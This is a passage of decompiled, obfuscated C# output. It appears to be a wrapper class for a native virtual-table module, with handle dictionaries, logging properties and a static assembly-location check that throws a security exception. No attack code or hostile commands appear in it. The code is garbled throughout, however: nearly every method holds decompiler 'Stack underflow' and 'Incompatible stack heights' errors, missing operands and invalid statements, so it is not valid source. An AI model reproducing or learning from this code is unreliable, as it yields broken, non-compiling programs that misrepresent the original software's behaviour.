			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal abstract class _0082 : IDisposable, global::_0002._001E
	{
		internal sealed class _0001 : IDisposable, global::_0013._0019
		{
			private const bool m__0001 = true;

			private const bool m__0002 = true;

			private const string m__0001 = "native module implementation not available";

			internal _0082 _0001;

			internal bool _0003;

			public _0001(_0082 _0098_0015_0006)
			{
				this._0001 = _0098_0015_0006;
			}

			public unsafe global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007)
			{
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				//IL_003f: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0080._0014._0001(107353921);
					IntPtr intPtr = global::_0011._0018._0001((string)/*Error near IL_0017: Stack underflow*/);
					*(IntPtr*)(nint)/*Error near IL_001c: Stack underflow*/ = intPtr;
					return global::_0080._0017._0003;
				}
				return this._0001._0001(_0002, _0003, _0004, _0005, ref _0006, ref _0007);
			}

			public unsafe global::_0080._0017 _0002(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007)
			{
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				//IL_003f: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0080._0014._0001(107353921);
					IntPtr intPtr = global::_0011._0018._0001((string)/*Error near IL_0017: Stack underflow*/);
					*(IntPtr*)(nint)/*Error near IL_001c: Stack underflow*/ = intPtr;
					return global::_0080._0017._0003;
				}
				return this._0001._0002(_0002, _0003, _0004, _0005, ref _0006, ref _0007);
			}

			public global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, _0003);
			}

			public global::_0080._0017 _0001(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002);
			}

			public global::_0080._0017 _0002(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0002(_0002);
			}

			public global::_0080._0017 _0001(IntPtr _0002, ref IntPtr _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, ref _0003);
			}

			public global::_0080._0017 _0003(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0003(_0002);
			}

			public global::_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005, IntPtr _0006)
			{
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_002c: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_002c: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, _0003, _0004, _0005, _0006);
			}

			public global::_0080._0017 _0004(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0004(_0002);
			}

			public int _0001(IntPtr _0002)
			{
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0028: Stack underflow*/);
					return 1;
				}
				return this._0001._0001(_0002);
			}

			public global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004)
			{
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0028: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, _0003, _0004);
			}

			public global::_0080._0017 _0001(IntPtr _0002, ref long _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, ref _0003);
			}

			public global::_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, ref long _0005)
			{
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_002a: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, _0003, _0004, ref _0005);
			}

			public global::_0080._0017 _0005(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0005(_0002);
			}

			public global::_0080._0017 _0006(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0006(_0002);
			}

			public global::_0080._0017 _0007(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0007(_0002);
			}

			public global::_0080._0017 _0008(IntPtr _0002)
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0026: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0008(_0002);
			}

			public int _0001(IntPtr _0002, int _0003, IntPtr _0004, ref global::_0019._001F _0005, ref IntPtr _0006)
			{
				//IL_0024: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_002e: Stack underflow*/);
					return 0;
				}
				return this._0001._0001(_0002, _0003, _0004, ref _0005, ref _0006);
			}

			public global::_0080._0017 _0002(IntPtr _0002, IntPtr _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0002(_0002, _0003);
			}

			public global::_0080._0017 _0001(IntPtr _0002, int _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0001(_0002, _0003);
			}

			public global::_0080._0017 _0002(IntPtr _0002, int _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0002(_0002, _0003);
			}

			public global::_0080._0017 _0003(IntPtr _0002, int _0003)
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				//IL_0027: Incompatible stack heights: 0 vs 1
				if (((_0001)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0011._0018._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
					return (global::_0080._0017)/*Error near IL_000e: Stack underflow*/;
				}
				return this._0001._0003(_0002, _0003);
			}

			public void _0001()
			{
				//IL_0013: Incompatible stack heights: 0 vs 2
				//IL_001d: Incompatible stack heights: 0 vs 2
				_ = 1;
				global::_0011._0018._0001((byte)/*Error near IL_001a: Stack underflow*/ != 0, (_0001)/*Error near IL_001a: Stack underflow*/);
				_ = _0091_0002._009B_0005;
				/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
			}

			void IDisposable.Dispose()
			{
				//ILSpy generated this explicit interface implementation from .override directive in 
				this._0001();
			}

			protected override void _0002()
			{
				//IL_0008: Incompatible stack heights: 0 vs 2
				try
				{
					_ = 0;
					global::_0011._0018._0001((byte)/*Error near IL_000f: Stack underflow*/ != 0, (_0001)/*Error near IL_000f: Stack underflow*/);
				}
				finally
				{
					global::_0008._009E(this);
				}
			}

			static _0001()
			{
				//IL_00bb: Incompatible stack heights: 0 vs 1
				bool flag = false;
				global::_0001._0001();
				Assembly assembly;
				if (true)
				{
					assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
				}
				Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
				if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
				{
					return;
				}
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
		}

		internal static readonly int _0001 = 2;

		internal global::_0017._0084._001D _0001;

		internal global::_0017._0084._001C _0001;

		internal IntPtr _0001;

		private Dictionary<IntPtr, _0081> m__0001;

		private Dictionary<IntPtr, global::_0017._0086> m__0001;

		private Dictionary<string, global::_0012._0014> m__0001;

		private bool m__0001;

		private bool m__0002;

		private bool m__0003;

		internal string _0001;

		internal bool _0004;

		protected virtual bool LogErrorsNoThrow
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0082)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0082)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		protected virtual bool LogExceptionsNoThrow
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0082)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0082)/*Error near IL_0009: Stack underflow*/).m__0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public virtual bool LogErrors
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				return ((_0082)/*Error near IL_000b: Stack underflow*/).LogErrorsNoThrow;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0015: Stack underflow*/);
				((_0082)/*Error near IL_000c: Stack underflow*/).LogErrorsNoThrow = value;
			}
		}

		public virtual bool LogExceptions
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				return ((_0082)/*Error near IL_000b: Stack underflow*/).LogExceptionsNoThrow;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0015: Stack underflow*/);
				((_0082)/*Error near IL_000c: Stack underflow*/).LogExceptionsNoThrow = value;
			}
		}

		public virtual bool Declared
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				return ((_0082)/*Error near IL_000b: Stack underflow*/).m__0003;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0082)/*Error near IL_0009: Stack underflow*/).m__0003 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public virtual string Name
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0082)/*Error near IL_0014: Stack underflow*/);
				return ((_0082)/*Error near IL_000b: Stack underflow*/)._0001;
			}
		}

		public _0082(string _0004_001F)
		{
			if (_0004_001F == null)
			{
				throw new ArgumentNullException(global::_0080._0014._0001(107375455));
			}
			this._0001 = _0004_001F;
			this.m__0001 = new Dictionary<IntPtr, _0081>();
			this.m__0001 = new Dictionary<IntPtr, global::_0017._0086>();
			this.m__0001 = new Dictionary<string, global::_0012._0014>();
		}

		internal void _0001(IntPtr _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			IntPtr zero = IntPtr.Zero;
			((_0082)/*Error near IL_000c: Stack underflow*/)._0001 = zero;
		}

		internal global::_0017._0084._001D _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			((_0082)/*Error near IL_0017: Stack underflow*/)._0001();
			return global::_0011._0018._0001((_0082)/*Error near IL_000b: Stack underflow*/, (global::_0013._0019)/*Error near IL_000b: Stack underflow*/);
		}

		private global::_0080._0017 _0001(bool _0002, IntPtr _0003, IntPtr _0004, int _0005, IntPtr _0006, ref IntPtr _0007, ref IntPtr _0008)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001(_0003: IntPtr.Zero, _0002: (IntPtr)/*Error near IL_00af: Stack underflow*/);
				global::_0011._0018._0001((IntPtr)/*Error near IL_00b9: Stack underflow*/);
				string text = (string)/*Error near IL_0015: Stack underflow*/;
				global::_0017._0080 obj = new global::_0017._0080(_0003, text, _000F_0017_0006: false);
				try
				{
					_0081 obj2 = null;
					string text2 = null;
					if ((_0002 && _0001(obj, _0004, global::_0011._0018._0001(_0006, _0005), ref obj2, ref text2) == global::_0080._0017._0002) || (!_0002 && this._0002(obj, _0004, global::_0011._0018._0001(_0006, _0005), ref obj2, ref text2) == global::_0080._0017._0002))
					{
						if (obj2 != null)
						{
							_0007 = this._0001(obj2);
							return global::_0080._0017._0002;
						}
						_0008 = global::_0011._0018._0001(global::_0080._0014._0001(107375446));
					}
					else
					{
						_0008 = global::_0011._0018._0001(text2);
					}
				}
				finally
				{
					if (obj != null)
					{
						global::_0008._007E_0098(obj);
					}
				}
			}
			catch (Exception ex)
			{
				_0008 = global::_0011._0018._0001(global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		private global::_0080._0017 _0001(bool _0002, IntPtr _0003)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0048: Stack underflow*/)._0001((IntPtr)/*Error near IL_0048: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null && ((_0002 && this._0002(obj) == global::_0080._0017._0002) || (!_0002 && this._0001(obj) == global::_0080._0017._0002)))
				{
					if (this.m__0001 != null)
					{
						this.m__0001.Remove(_0003);
					}
					return global::_0080._0017._0002;
				}
			}
			catch (Exception ex)
			{
				try
				{
					if (LogExceptionsNoThrow)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107375417), new object[2]
						{
							_0002 ? global::_0080._0014._0001(107374835) : global::_0080._0014._0001(107374820),
							ex
						}));
					}
				}
				catch
				{
				}
			}
			finally
			{
				this._0003(_0003);
			}
			return global::_0080._0017._0003;
		}

		protected virtual global::_0013._0019 _0001()
		{
			return null;
		}

		protected virtual global::_0013._0019 _0002()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			new _0001((_0082)/*Error near IL_000d: Stack underflow*/);
			return (global::_0013._0019)/*Error near IL_0005: Stack underflow*/;
		}

		protected virtual IntPtr _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = _009C_0004._0084_000E;
			_0091._0080_0004(typeof(global::_0017._0084._001E).TypeHandle);
			/*Error near IL_0028: Stack underflow*/((Type)/*Error near IL_0028: Stack underflow*/);
			int num = (int)/*Error near IL_002b: Stack underflow*/;
			return global::_0011._0018._0001(num);
		}

		protected virtual void _0002(IntPtr _0002)
		{
			//IL_005a: Incompatible stack heights: 0 vs 2
			//IL_0061: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0061: Stack underflow*/((IntPtr)/*Error near IL_0061: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ == 0)
			{
				int num = 0;
				global::_0011._0018._0001(num, _0002, IntPtr.Zero);
				num = global::_0011._0018._0001(num, _001B_0003._0097_0006(), 4);
				global::_0011._0018._0001(num, 0, _0002);
				num = global::_0011._0018._0001(num, 4, _001B_0003._0097_0006());
				global::_0011._0018._0001(num, _0002, IntPtr.Zero);
			}
		}

		protected virtual void _0003(IntPtr _0002)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			((_0082)/*Error near IL_001a: Stack underflow*/)._0001((IntPtr)/*Error near IL_001a: Stack underflow*/, (string)null);
			global::_0011._0018._0001(_0002);
		}

		protected virtual IntPtr _0002()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = _009C_0004._0084_000E;
			_0091._0080_0004(typeof(global::_0017._0084._001F).TypeHandle);
			/*Error near IL_0028: Stack underflow*/((Type)/*Error near IL_0028: Stack underflow*/);
			int num = (int)/*Error near IL_002b: Stack underflow*/;
			return global::_0011._0018._0001(num);
		}

		protected virtual void _0004(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
		}

		protected virtual IntPtr _0001(IntPtr _0002)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0082)/*Error near IL_0012: Stack underflow*/, (IntPtr)/*Error near IL_0012: Stack underflow*/);
			return (IntPtr)/*Error near IL_0007: Stack underflow*/;
		}

		protected virtual _0081 _0001(IntPtr _0002)
		{
			//IL_0074: Incompatible stack heights: 0 vs 2
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_007e: Stack underflow*/((IntPtr)/*Error near IL_007e: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				string text = global::_0080._0014._0001(107374790);
				((_0082)/*Error near IL_0022: Stack underflow*/)._0001(_0002, text);
				return null;
			}
			if (this.m__0001 != null && this.m__0001.TryGetValue(_0002, out var value))
			{
				return value;
			}
			_0001(_0002, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107374761), new object[1] { _0002 }));
			return null;
		}

		protected virtual IntPtr _0001(_0081 _0002)
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((_0082)/*Error near IL_000e: Stack underflow*/).m__0001 == null)
			{
				return IntPtr.Zero;
			}
			IntPtr intPtr = IntPtr.Zero;
			bool flag = false;
			try
			{
				intPtr = this._0001();
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					this._0002(intPtr);
					_0002.NativeHandle = intPtr;
					this.m__0001.Add(intPtr, _0002);
					flag = true;
				}
			}
			finally
			{
				if (!flag && _0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					this._0003(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
			return intPtr;
		}

		protected virtual global::_0017._0086 _0001(IntPtr _0002, IntPtr _0003)
		{
			//IL_0074: Incompatible stack heights: 0 vs 2
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_007e: Stack underflow*/((IntPtr)/*Error near IL_007e: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				string text = global::_0080._0014._0001(107374748);
				((_0082)/*Error near IL_0022: Stack underflow*/)._0001(_0002, text);
				return null;
			}
			if (this.m__0001 != null && this.m__0001.TryGetValue(_0003, out var value))
			{
				return value;
			}
			_0001(_0002, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107374719), new object[1] { _0003 }));
			return null;
		}

		protected virtual IntPtr _0001(global::_0017._0086 _0002)
		{
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_007c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((_0082)/*Error near IL_000e: Stack underflow*/).m__0001 == null)
			{
				return IntPtr.Zero;
			}
			IntPtr intPtr = IntPtr.Zero;
			bool flag = false;
			try
			{
				intPtr = this._0002();
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					_0002.NativeHandle = intPtr;
					this.m__0001.Add(intPtr, _0002);
					flag = true;
				}
			}
			finally
			{
				if (!flag && _0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					this._0004(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
			return intPtr;
		}

		protected virtual string _0001(int _0002, string _0003, global::_0012._0014 _0004)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_008F_0003._008B_0007();
			global::_0080._0014._0001(107374674);
			return global::_0011._0018._0001(_0004: new object[2] { _0002, _0003 }, _0002: (IFormatProvider)/*Error near IL_0029: Stack underflow*/, _0003: (string)/*Error near IL_0029: Stack underflow*/);
		}

		protected unsafe virtual global::_0080._0017 _0001(global::_0017._0080 _0002, string _0003, ref string _0004)
		{
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107374629);
				*(_003F*)(nint)/*Error near IL_000e: Stack underflow*/ = /*Error near IL_000e: Stack underflow*/;
				return global::_0080._0017._0003;
			}
			global::_0011._0013 obj = _0002._0001;
			if (obj == null)
			{
				_0004 = global::_0080._0014._0001(107374604);
				return global::_0080._0017._0003;
			}
			if (_0003 == null)
			{
				_0004 = global::_0080._0014._0001(107375075);
				return global::_0080._0017._0003;
			}
			return obj._0001(this, _0003, ref _0004);
		}

		protected unsafe virtual global::_0080._0017 _0001(global::_0017._0080 _0002, int _0003, string _0004, ref string _0005)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107374629);
				*(_003F*)(nint)/*Error near IL_000e: Stack underflow*/ = /*Error near IL_000e: Stack underflow*/;
				return global::_0080._0017._0003;
			}
			global::_0011._0013 obj = _0002._0001;
			if (obj == null)
			{
				_0005 = global::_0080._0014._0001(107374604);
				return global::_0080._0017._0003;
			}
			return obj._0001(this, _0003, _0004, ref _0005);
		}

		protected virtual bool _0001(IntPtr _0002, string _0003)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			return global::_0011._0018._0001(_0004: ((_0082)/*Error near IL_000b: Stack underflow*/).LogErrorsNoThrow, _0005: LogExceptionsNoThrow, _0002: (_0082)/*Error near IL_0017: Stack underflow*/, _0003: (IntPtr)/*Error near IL_0017: Stack underflow*/, _0006: _0003);
		}

		protected virtual bool _0001(_0081 _0002, string _0003)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			_ = ((_0082)/*Error near IL_0020: Stack underflow*/).LogErrorsNoThrow;
			bool flag = (byte)/*Error near IL_0023: Stack underflow*/ != 0;
			bool flag2 = LogExceptionsNoThrow;
			return global::_0011._0018._0001(flag2, _0002, flag, this, _0003);
		}

		protected virtual bool _0001(global::_0017._0086 _0002, string _0003)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			_ = ((_0082)/*Error near IL_0020: Stack underflow*/).LogErrorsNoThrow;
			bool flag = (byte)/*Error near IL_0023: Stack underflow*/ != 0;
			bool flag2 = LogExceptionsNoThrow;
			return global::_0011._0018._0001(_0003, flag2, flag, _0002, this);
		}

		protected virtual bool _0001(global::_0014._0018 _0002, double? _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
